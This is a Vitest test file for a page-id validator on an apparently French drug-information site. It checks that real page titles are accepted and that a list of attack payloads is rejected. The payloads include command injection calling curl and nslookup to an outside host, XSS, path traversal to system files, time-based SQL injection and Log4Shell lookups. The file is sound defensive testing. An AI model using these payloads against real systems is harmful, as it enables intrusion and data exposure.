import { describe, it, expect } from "vitest";
import { isValidPageId } from "./route";

describe("isValidPageId", () => {
  describe("valid page ids", () => {
    it.each([
      "Accueil",
      "Système cardiovasculaire",
      "Système génital, urinaire et hormones sexuelles",
      "Article Automédication : ce que vous devez savoir",
      "Article Vaccins et grossesse : ce qu'il faut savoir avant et pendant la grossesse",
      "Article Pourquoi les doses de médicaments sont-elles différentes selon le poids ?",
      "Enoxaparine Crusia 10 000 Ui (100 mg)/1 mL, solution injectable en seringue préremplie",
      "17 B Estradiol Besins-iscovesco 0,06 Pour Cent, gel pour application cutanée en tube",
      "Liste des médicaments A",
      "Recherche paracétamol",
      "Numéros utiles & repères pratiques autour des médicaments",
    ])("accepts %s", (pageId) => {
      expect(isValidPageId(pageId)).toBe(true);
    });
  });

  describe("attack payloads", () => {
    it.each([
      // command injection
      ";(nslookup -q=cname hit.bxss.me||curl hit.bxss.me)",
      "&(nslookup${IFS}-q${IFS}cname${IFS}hit.bxss.me||curl hit.bxss.me)&'",
      "|echo darzgv$()\\nz^xyu||a",
      "`(nslookup -q=cname hit.bxss.me||curl hit.bxss.me)`",
      // XSS
      "<script>alert(1)</script>",
      "'><img onerror=alert(1) src=>",
      "javascript:alert(1)",
      // path traversal
      "../../../../../../etc/shells",
      "c:/windows/win.ini",
      // SQL injection
      "Article foo'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98),15)||'",
      "Article foo') OR 1=(SELECT 1 FROM PG_SLEEP(15))--",
      "Article foo0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",
      // JNDI / Log4Shell
      "${j${::-n}di:dns${::-:}//hit.bxss.me}",
      "${${lower:j}${::-n}d${upper:i}:dns${::-:}//hit.bxss.me}",
      // URL / protocol
      "http://bxss.me/t/fit.txt",
      "Http://bxss.me/t/fit.txt%3F.jpg",
      // misc
      '"',
      "@bxss.me",
    ])("rejects %s", (pageId) => {
      expect(isValidPageId(pageId)).toBe(false);
    });
  });
});
